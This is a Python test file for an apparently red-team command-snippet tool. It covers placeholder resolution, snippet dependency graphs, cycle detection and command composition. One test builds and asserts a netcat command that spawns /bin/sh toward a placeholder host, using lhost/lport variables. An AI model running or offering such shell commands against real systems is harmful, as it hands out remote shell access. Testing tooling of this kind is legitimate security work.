from __future__ import annotations

from redscribe.content.snippets import (
    BUILTIN_BY_KEY,
    BUILTIN_SNIPPETS,
    KNOWN_VARIABLES,
    build_snippet_graph,
    compose,
    dependency_roots,
    detect_snippet_cycles,
    resolve_command,
    snippet_key,
    snippet_placeholders,
    snippet_refs,
    topological_order,
    validate_snippet,
)
from redscribe.domain.models import Snippet


def test_builtin_snippets_have_unique_keys_and_commands() -> None:
    keys = [snippet.builtin_key for snippet in BUILTIN_SNIPPETS]
    assert len(keys) == len(set(keys))
    assert set(BUILTIN_BY_KEY) == set(keys)
    assert all(snippet.builtin for snippet in BUILTIN_SNIPPETS)
    assert all(snippet.command.strip() for snippet in BUILTIN_SNIPPETS)
    assert len(BUILTIN_SNIPPETS) >= 70


def test_snippet_placeholders_preserves_order_and_uniqueness() -> None:
    assert snippet_placeholders("ssh {{user}}@{{target}} {{user}}") == ["user", "target"]
    assert snippet_placeholders("nmap -sV example.test") == []


def test_resolve_command_uses_target_context() -> None:
    command = "nmap -sV {{target}} && curl {{url}} && host {{domain}}"
    resolved = resolve_command(command, target="https://app.acme.test:8443/login")
    assert resolved == (
        "nmap -sV https://app.acme.test:8443/login "
        "&& curl https://app.acme.test:8443/login "
        "&& host app.acme.test"
    )


def test_resolve_command_prefers_explicit_values() -> None:
    resolved = resolve_command(
        "ssh {{user}}@{{target}}",
        target="10.10.10.10",
        values={"user": "alice", "target": "192.0.2.5"},
    )
    assert resolved == "ssh alice@192.0.2.5"


def test_resolve_command_rederives_context_from_explicit_target() -> None:
    resolved = resolve_command(
        "{{target}} {{domain}} {{url}}",
        target="ignored.test",
        values={"target": "https://app.acme.test:8443/login"},
    )
    assert resolved == (
        "https://app.acme.test:8443/login app.acme.test https://app.acme.test:8443/login"
    )


def test_resolve_command_supports_ipv6_targets() -> None:
    resolved = resolve_command("curl {{url}}", target="[2001:db8::1]:8443")
    assert resolved == "curl https://[2001:db8::1]:8443"


def test_resolve_command_leaves_unknown_placeholders() -> None:
    assert resolve_command("echo {{missing}}") == "echo {{missing}}"
    assert resolve_command("echo {{missing}}", values={"missing": "  "}) == "echo {{missing}}"


def _snippet(key: str, command: str) -> Snippet:
    return Snippet(title=key, command=command, builtin=True, builtin_key=key)


def test_snippet_refs_and_known_variable_vocabulary() -> None:
    assert snippet_refs("{{snippet:one}} {{snippet:two}} {{snippet:one}}") == ["one", "two"]
    assert snippet_refs("echo hi") == []
    assert {"target", "domain", "lhost", "lport"} <= KNOWN_VARIABLES
    assert snippet_key(_snippet("key", "echo hi")) == "key"


def test_build_snippet_graph_marks_unresolved_edges() -> None:
    caller = _snippet("caller", "echo {{snippet:callee}} {{snippet:ghost}}")
    callee = _snippet("callee", "echo {{target}}")
    edges = build_snippet_graph([caller, callee])
    assert [(edge.caller, edge.dependency, edge.resolved) for edge in edges] == [
        ("caller", "callee", True),
        ("caller", "ghost", False),
    ]
    assert dependency_roots(edges) == ("caller",)


def test_detect_cycle_and_topological_order() -> None:
    first = _snippet("a", "echo {{snippet:b}}")
    second = _snippet("b", "echo {{snippet:a}}")
    cycles = detect_snippet_cycles(build_snippet_graph([first, second]))
    assert len(cycles) == 1
    assert set(cycles[0]) == {"a", "b"}
    assert cycles[0][0] == cycles[0][-1]

    root = _snippet("root", "{{snippet:left}} {{snippet:right}}")
    left = _snippet("left", "{{snippet:leaf}}")
    right = _snippet("right", "{{snippet:leaf}}")
    leaf = _snippet("leaf", "echo done")
    edges = build_snippet_graph([root, left, right, leaf])
    assert detect_snippet_cycles(edges) == ()
    order = topological_order(edges, nodes=("root", "left", "right", "leaf"))
    assert order.index("root") < order.index("left") < order.index("leaf")


def test_validate_snippet_variables() -> None:
    assert [issue.code for issue in validate_snippet("echo {{bogus}} {{target}}")] == [
        "unknown-variable"
    ]
    assert validate_snippet("echo {{target}}") == ()
    assert validate_snippet("echo {{bogus}}", allowed={"bogus"}) == ()
    assert validate_snippet("  ")[0].code == "empty-command"


def test_compose_expands_references_once_and_resolves_values() -> None:
    listener = _snippet("listener", "nc -lvnp {{lport}}")
    shell = _snippet("shell", "{{snippet:listener}} -e /bin/sh {{lhost}}")
    result = compose(shell, listener, values={"lhost": "10.0.0.1", "lport": "4444"})
    assert result.ok is True
    assert result.command == "nc -lvnp 4444 -e /bin/sh 10.0.0.1"
    assert result.cycles == ()
    assert result.order == ("shell", "listener")


def test_compose_reports_cycles_and_missing_dependencies() -> None:
    first = _snippet("a", "echo {{snippet:b}}")
    second = _snippet("b", "echo {{snippet:a}}")
    cyclic = compose(first, second)
    assert cyclic.ok is False
    assert cyclic.command == ""
    assert cyclic.cycles
    assert any(issue.code == "cyclic-dependency" for issue in cyclic.issues)

    missing = compose(_snippet("solo", "echo {{snippet:ghost}}"))
    assert missing.ok is False
    assert missing.command == "echo {{snippet:ghost}}"
    assert any(issue.code == "missing-dependency" for issue in missing.issues)
